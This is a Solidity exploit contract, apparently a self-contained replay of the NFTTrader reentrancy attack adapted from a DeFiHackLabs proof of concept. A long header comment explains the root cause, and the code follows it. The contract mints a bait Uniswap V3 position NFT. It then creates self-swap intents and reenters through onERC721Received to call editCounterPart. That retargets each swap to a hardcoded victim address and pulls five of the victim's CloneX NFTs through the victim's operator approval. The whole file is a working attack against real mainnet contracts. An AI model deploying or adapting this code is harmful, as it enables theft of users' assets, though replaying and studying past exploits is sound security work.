// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-12-NFTTrader).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry `ContractTest`
// contract (uses cheatcodes: createSelectFork, deal, vm.roll, vm.recordLogs /
// getRecordedLogs to read the emitted swapId back out of the createSwapIntent
// log), so there is no standalone contract to deploy and no cheatcode-free way
// to read the swapId. This is a faithful, self-contained copy of that inline
// attack, with two mechanical substitutions:
//   1. ETH working capital (the test's `deal(address(this), ...)` calls) is
//      forwarded to this contract in the unrecorded setup phase instead.
//   2. The five `_swapId` values NFTTrader's global swap-intent counter
//      assigns are hardcoded (10348..10352) instead of captured via
//      vm.recordLogs()/getRecordedLogs(). This is safe: `_swapIds` is a single
//      contract-wide Counters.Counter incremented once per createSwapIntent
//      call by ANY caller -- it does not depend on which address calls it --
//      so replaying against the same anvil_state.json fork snapshot with this
//      contract as the sole caller reproduces the exact same sequence every
//      time (confirmed by running the original Foundry PoC with -vvvv against
//      the dumped state: createSwapIntent emits swapId 10348, 10349, 10350,
//      10351, 10352 in order for tokenIds 6670, 6650, 4843, 5432, 9870).
// Logic and constants are otherwise copied verbatim from test/NFTTrader_exp.sol.
//
// Root cause: NFTTrader.closeSwapIntent() walks the swap's two NFT arrays and
// safeTransferFrom's each one, but re-reads `addressTwo` from STORAGE on every
// iteration instead of caching it once. The very first item transferred here
// is the attacker's own bait NFT (self-transfer: addressTwo == addressOne ==
// attacker at this point), which fires `onERC721Received` on the attacker's
// contract mid-loop. NFTTrader has no reentrancy guard, so the attacker
// reenters with `editCounterPart(swapId, victim)` -- a function that only
// checks the caller is the swap's ORIGINAL creator, with no check that the
// swap isn't already executing. This retargets `addressTwo` to a victim who
// merely `setApprovalForAll`'d NFTTrader as an operator (to use the dApp
// normally) -- the victim never agreed to THIS swap. The very next loop
// iteration re-reads the now-poisoned `addressTwo` and pulls the victim's real
// NFT to the attacker, using NFTTrader's operator approval. Repeated once per
// victim NFT (5x here), each costing only the platform's dust ETH swap fee.

interface IUniV3PosNFT {
    struct MintParams {
        address token0;
        address token1;
        uint24 fee;
        int24 tickLower;
        int24 tickUpper;
        uint256 amount0Desired;
        uint256 amount1Desired;
        uint256 amount0Min;
        uint256 amount1Min;
        address recipient;
        uint256 deadline;
    }

    function setApprovalForAll(address operator, bool approved) external;

    function mint(
        MintParams memory params
    ) external payable returns (uint256 tokenId, uint128 liquidity, uint256 amount0, uint256 amount1);
}

interface INFTTrader {
    struct swapIntent {
        uint256 id;
        address addressOne;
        uint256 valueOne;
        address addressTwo;
        uint256 valueTwo;
        uint256 swapStart;
        uint256 swapEnd;
        uint256 swapFee;
        uint8 status;
    }

    struct swapStruct {
        address dapp;
        address typeStd;
        uint256[] tokenId;
        uint256[] blc;
        bytes data;
    }

    function closeSwapIntent(address _swapCreator, uint256 _swapId) external payable;

    function createSwapIntent(
        swapIntent memory _swapIntent,
        swapStruct[] memory _nftsOne,
        swapStruct[] memory _nftsTwo
    ) external payable;

    function editCounterPart(uint256 _swapId, address _counterPart) external;
}

interface ICloneX {
    function isApprovedForAll(address owner, address operator) external view returns (bool);
}

contract NFTTraderExploit {
    IUniV3PosNFT private constant UniV3PosNFT = IUniV3PosNFT(0xC36442b4a4522E871399CD717aBDD847Ab11FE88);
    INFTTrader private constant NFTTrader = INFTTrader(0xC310e760778ECBca4C65B6C559874757A4c4Ece0);
    ICloneX private constant CloneX = ICloneX(0x49cF6f5d44E70224e2E23fDcdd2C053F30aDA28B);
    address private constant victim = 0x23938954BC875bb8309AEF15e2Dead54884B73Db;
    address private constant tradeSquad = 0x58874d2951524F7f851bbBE240f0C3cF0b992d79;

    uint256 private swapId;

    // Deterministic swapId sequence assigned by NFTTrader's global counter for
    // this fork block -- see header comment. Paired with the victim's CloneX
    // token ids in the same order as the original PoC.
    uint256[5] private swapIds = [uint256(10348), 10349, 10350, 10351, 10352];
    uint256[5] private victimsCloneXTokenIds = [uint256(6670), 6650, 4843, 5432, 9870];

    // Accept the ETH working capital forwarded from the attacker in the
    // unrecorded setup phase (standing in for the test's `deal` cheatcode).
    receive() external payable {}

    /// @notice The recorded entrypoint. ETH working capital (standing in for the
    ///         test's `deal(address(this), ...)` calls) is forwarded to this
    ///         contract in the unrecorded setup phase, so testExploit() takes no
    ///         value and reads its own ETH balance directly via `{value: ...}`.
    function testExploit() external {
        // Mint a cheap, near-worthless UniV3 position NFT purely as reentrancy
        // bait -- it is transferred to (and stays with) the attacker itself; it
        // carries no value out of the attack.
        //
        // NOTE: the original test used `address(this).balance` here because it
        // had funded itself with EXACTLY 0.001 ether via `deal()` moments before
        // (then re-funded to 0.1 ether via a SECOND `deal()` afterward, for the
        // swap fees). This contract receives its ENTIRE working capital upfront
        // (see the setup step in the config), so `address(this).balance` would
        // wrongly send everything into the mint. Use the same 0.001 ether the
        // original balance actually held instead.
        uint256 mintValue = 0.001 ether;
        IUniV3PosNFT.MintParams memory params = IUniV3PosNFT.MintParams({
            token0: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, // USDC
            token1: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, // WETH
            fee: 500,
            tickLower: 0,
            tickUpper: 100_000,
            amount0Desired: 0,
            amount1Desired: mintValue,
            amount0Min: 0,
            amount1Min: 0,
            recipient: address(this),
            deadline: block.timestamp
        });

        (uint256 positionId,,,) = UniV3PosNFT.mint{value: mintValue}(params);

        // Faithful copy of the original PoC -- approves CloneX as an operator
        // on the position-NFT contract. Unused by the attack path itself.
        UniV3PosNFT.setApprovalForAll(address(CloneX), true);
        UniV3PosNFT.setApprovalForAll(address(NFTTrader), true);

        // Sanity precondition: the victim previously approved NFTTrader as an
        // operator for their CloneX collection (to use the dApp normally).
        // That approval is what the reentrant `editCounterPart` hijack abuses.
        require(CloneX.isApprovedForAll(victim, address(NFTTrader)), "victim approval missing");

        for (uint256 i = 0; i < victimsCloneXTokenIds.length; ++i) {
            // Create a swap intent naming the attacker as BOTH sides
            // (addressOne == addressTwo == address(this)) -- this passes every
            // check trivially and lets closeSwapIntent below be called
            // immediately, with the counterpart retargeted to the victim via
            // reentrancy mid-execution.
            INFTTrader.swapIntent memory _swapIntent = INFTTrader.swapIntent({
                id: 0,
                addressOne: address(0),
                valueOne: 0,
                addressTwo: address(this),
                valueTwo: 0,
                swapStart: 0,
                swapEnd: 0,
                swapFee: 0,
                status: 0
            });

            INFTTrader.swapStruct[] memory _nftsOne = new INFTTrader.swapStruct[](0);
            INFTTrader.swapStruct[] memory _nftsTwo = new INFTTrader.swapStruct[](2);

            uint256[] memory _tokenId1 = new uint256[](1);
            _tokenId1[0] = positionId;
            uint256[] memory _blc = new uint256[](0);
            // Item 0: the bait position NFT -- transferred attacker -> attacker
            // first inside closeSwapIntent, which fires onERC721Received below
            // and lets us hijack the swap before item 1 is processed.
            _nftsTwo[0] = INFTTrader.swapStruct({
                dapp: address(UniV3PosNFT),
                typeStd: tradeSquad,
                tokenId: _tokenId1,
                blc: _blc,
                data: ""
            });

            uint256[] memory _tokenId2 = new uint256[](1);
            _tokenId2[0] = victimsCloneXTokenIds[i];
            // Item 1: the victim's real CloneX NFT -- transferred using
            // NFTTrader's operator approval once addressTwo has been
            // retargeted to the victim by the reentrant call.
            _nftsTwo[1] = INFTTrader.swapStruct({
                dapp: address(CloneX),
                typeStd: tradeSquad,
                tokenId: _tokenId2,
                blc: _blc,
                data: ""
            });

            swapId = swapIds[i];
            NFTTrader.createSwapIntent{value: 0.005 ether}(_swapIntent, _nftsOne, _nftsTwo);
            NFTTrader.closeSwapIntent{value: 0.005 ether}(address(this), swapId);
        }
    }

    /// @notice Fired mid-loop inside closeSwapIntent when the bait position NFT
    ///         is safeTransferFrom'd (attacker -> attacker). NFTTrader has no
    ///         reentrancy guard, so this reenters and retargets the swap's
    ///         counterpart to the victim before the NEXT loop item (the
    ///         victim's real CloneX NFT) is transferred.
    function onERC721Received(
        address, /* operator */
        address, /* from */
        uint256, /* tokenId */
        bytes calldata /* data */
    ) external returns (bytes4) {
        NFTTrader.editCounterPart(swapId, victim);
        return this.onERC721Received.selector;
    }
}
